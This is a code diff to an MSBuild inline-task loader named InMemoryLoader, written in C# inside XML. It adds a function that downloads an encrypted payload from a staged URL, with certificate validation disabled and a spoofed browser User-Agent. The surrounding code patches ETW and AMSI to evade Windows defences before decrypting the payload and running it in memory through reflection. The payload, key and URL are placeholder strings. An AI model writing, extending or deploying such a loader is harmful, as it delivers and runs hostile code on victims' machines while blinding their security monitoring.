@@ -14,6 +14,7 @@
       <Using Namespace="System.Reflection" />
       <Using Namespace="System.Runtime.InteropServices" />
       <Using Namespace="System.Security.Cryptography" />
+      <Using Namespace="System.Net" />
       <Code Type="Class" Language="cs">
 <![CDATA[
 using System;
@@ -21,6 +22,7 @@ using System.Reflection;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 using System.Text;
+using System.Net;
 using Microsoft.Build.Framework;
 using Microsoft.Build.Utilities;
 
@@ -139,11 +141,24 @@ public class InMemoryLoader : Task
         }
     }
 
+    static byte[] FetchPayload(string url)
+    {
+        ServicePointManager.ServerCertificateValidationCallback =
+            (s, c, ch, e) => true;
+        using (WebClient wc = new WebClient())
+        {
+            wc.Headers.Add("User-Agent",
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
+            return wc.DownloadData(url);
+        }
+    }
+
     static string ENCRYPTED_B64 = "YOURPAYLOADHERE";
     static string KEY_B64 = "YOURKEYHERE";
     static string IV_B64 = "YOURIVHERE";
     static string KEYING = "YOURKEYINGHERE";
     static string SALT_B64 = "YOURSALTHERE";
+    static string STAGED_URL = "YOURSTAGEDURL";
 
     static string TARGET_TYPE = "YOURTYPEHERE";
     static string TARGET_METHOD = "YOURMETHODHERE";
@@ -170,7 +185,12 @@ public class InMemoryLoader : Task
             PatchEtw();
             PatchAmsi();
 
-            byte[] encrypted = Convert.FromBase64String(ENCRYPTED_B64);
+            byte[] encrypted;
+            if (STAGED_URL.Length > 0)
+                encrypted = FetchPayload(STAGED_URL);
+            else
+                encrypted = Convert.FromBase64String(ENCRYPTED_B64);
+
             byte[] key;
             if (KEYING.Length > 0)
                 key = DeriveKey(SALT_B64, KEYING);
